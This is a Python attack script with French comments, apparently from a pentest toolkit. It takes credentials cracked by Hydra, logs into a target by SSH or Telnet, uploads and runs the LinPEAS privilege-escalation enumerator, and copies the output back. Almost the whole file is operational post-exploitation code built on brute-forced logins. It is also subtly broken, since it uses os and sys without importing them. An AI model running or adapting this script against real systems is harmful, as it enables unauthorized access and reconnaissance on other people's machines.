#!/usr/bin/env python3

import conf as conf
import paramiko
import telnetlib


def get_credentials(hydra_output_file):
    """ Extrait le login et le mot de passe du fichier de sortie Hydra. """
    with open(hydra_output_file, 'r') as file:
        for line in file:
            if "login:" in line and "password:" in line:
                parts = line.strip().split()
                username = parts[parts.index("login:") + 1]
                password = parts[parts.index("password:") + 1]
                return username, password
    return None, None

def execute_linpeas_ssh(ssh_client, host):
    """ Exécute LinPEAS sur un hôte distant via SSH et récupère la sortie. """
    remote_path = '/tmp/linpeas.sh'
    output_path = '/dev/shm/linpeas.txt'
    local_path = os.path.expanduser('~/.local/share/linpeas.sh')
    local_output_path = f"./{host}_linpeas_output.txt"
    
    sftp = ssh_client.open_sftp()
    try:
        sftp.put(local_path, remote_path)
        ssh_client.exec_command(f'chmod +x {remote_path} && {remote_path} -a > {output_path}')
        sftp.get(output_path, local_output_path)
        print(conf.colored(f"LinPEAS a été exécuté et le résultat est sauvegardé dans {local_output_path}", "green", attrs=["bold"]))
    finally:
        sftp.close()

def try_ssh(host, username, password):
    """ Tente une connexion SSH et exécute LinPEAS si réussie. """
    try:
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect(host, username=username, password=password)
        print(conf.colored(f"Connexion SSH réussie.", "green", attrs=["bold"]))
        execute_linpeas_ssh(ssh_client, host)
        ssh_client.close()
        return True
    except Exception as e:
        print(conf.colored(f"Échec de la connexion SSH.", "red", attrs=["bold"]))
        return False

def try_telnet(host, username, password, script_path):
    """ Tente de se connecter via Telnet et envoie des commandes pour exécuter un script si possible. """
    try:
        telnet_client = telnetlib.Telnet(host)
        telnet_client.read_until(b"login: ")
        telnet_client.write(username.encode('ascii') + b"\n")
        telnet_client.read_until(b"Password: ")
        telnet_client.write(password.encode('ascii') + b"\n")
        
        # Supposition que l'invite de commande est accessible
        telnet_client.read_until(b"$ ")
        
        # Envoie le script à l'interpréteur de commandes de la cible
        with open(script_path, 'r') as file:
            script_contents = file.read()
        telnet_client.write(script_contents.encode('ascii') + b"\n")
        telnet_client.write(b"exit\n")
        telnet_client.close()
        print(conf.colored(f"Tentative d'exécution de script via Telnet.", "green", attrs=["bold"]))
        return True
    except Exception as e:
        print(conf.colored(f"Échec de la connexion Telnet.", "red", attrs=["bold"]))
        return False

def main_linpeas():
    hydra_output_file = input(conf.colored(f"Entrez le chemin vers le fichier de résultat Hydra [reports/hydra/HOST/hydra.txt]: ", "green", attrs=["bold"]))
    host = input(conf.colored(f"Entrez l'adresse IP de la cible: ", "green", attrs=["bold"]))
    username, password = get_credentials(hydra_output_file)
    script_path = os.path.expanduser('~/.local/share/linpeas.sh')

    if username is None or password is None:
        print(conf.colored(f"Aucun identifiant valide trouvé dans le fichier de sortie Hydra.", "red", attrs=["bold"]))
        sys.exit(1)

    if not try_ssh(host, username, password):
        if not try_telnet(host, username, password, script_path):
            print(conf.colored(f"Échec de connexion avec tous les protocoles (SSH, Telnet).", "red", attrs=["bold"]))

if __name__ == '__main__':
    main_linpeas()
